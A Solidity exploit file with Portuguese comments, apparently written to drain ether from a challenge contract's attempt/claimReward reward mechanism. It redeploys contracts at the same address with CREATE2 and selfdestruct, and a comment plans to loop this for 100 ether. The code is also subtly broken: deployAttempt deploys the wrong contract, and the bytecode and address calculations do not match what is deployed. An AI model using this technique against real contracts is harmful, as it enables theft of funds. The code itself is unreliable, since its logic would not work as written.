pragma solidity 0.8.20; 

// 1- Create2 para criar Address A -> Contrato pra resolvero attempt 
// 2- Selfdestruct do Contrato Attempt
// 3- Create2 para criar Address A -> Contrato para dar claimReward no constructor e selfdestruct depois pra me enviar os ether 
// 4- Loop por 100 ether 
//


interface Target {
    function attempt(address target) external; 
    function claimReward(address target) external; 
}

// Contract to be able to get Reward
// Needs to be called with create2 and suicide 
contract Attempt {

    address payable owner; 

    constructor() {
        owner = payable(msg.sender); 
    }

    function first() external returns (bytes32 data) {

        return hex"deadbeef"; 

    }

    function second() external returns (bytes32 data) {

        return hex"c0ffeebabe"; 

    }

    function third() external returns (bytes32 data) {

        return hex"1337"; 

    }
    
    function hexString(string memory target) internal returns (bytes32 data) {
        
        assembly {
            let ptr := mload(0x40)    // Free Memory Pointer -> Allocate memory 
            mstore(0x40, 0x80)    // Point Memory Pointer to Free Memory again 
            mstore(ptr, 0x20)    // First Word = bytes32.length = 0x20
            mstore(add(ptr, 0x20), target)  // Second Word = Hexify String

            data := mload(ptr) 
        } 
    } 

    function suicide() external {
        selfdestruct(owner); 
    }
    
}

contract Redeem {

    fallback() external payable{
        payable(tx.origin).transfer(msg.value); 
    }

}

contract Exploit {

    address payable owner; 
    Target target;
    Redeem redeem; 
    Attempt attempt; 

    constructor(address _target) {
        owner = payable(msg.sender); 
        target = Target(_target); 
    }

    function withdraw() external {
        selfdestruct(owner); 
    }

    function deployRedeem(uint _salt) internal {  // random number 

        Redeem _contract = new Redeem{salt: bytes32(_salt)}(); 
        
    }

    function deployAttempt(uint _salt) internal {  // random number 

        Redeem _contract = new Redeem{salt: bytes32(_salt)}(); 
        
    }

    function getAddress(bytes memory bytecode, uint _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        
        return address(uint160(uint(hash))); // Address será os últimos 20 bytes
    }

    function getRedeemBytecode(address _owner) public pure returns (bytes memory) {
        bytes memory bytecode = type(Redeem).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_owner)); 

    }

    function getAttemptBytecode(address _owner) public pure returns (bytes memory) {
        bytes memory bytecode = type(Attempt).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_owner)); 

    }

    function exploit(uint x) external {

            // Create and kill Attempt 
        deployAttempt(x); 
        address _attempt = getAddress(getAttemptBytecode(msg.sender), x); 
        Attempt(_attempt).suicide(); 

            // Create Redeem and Redeem your money, which is a suicide in fallback
        deployRedeem(x); 
        address _redeem = getAddress(getRedeemBytecode(msg.sender), x); 
        target.claimReward(_redeem); 
        
    }


}
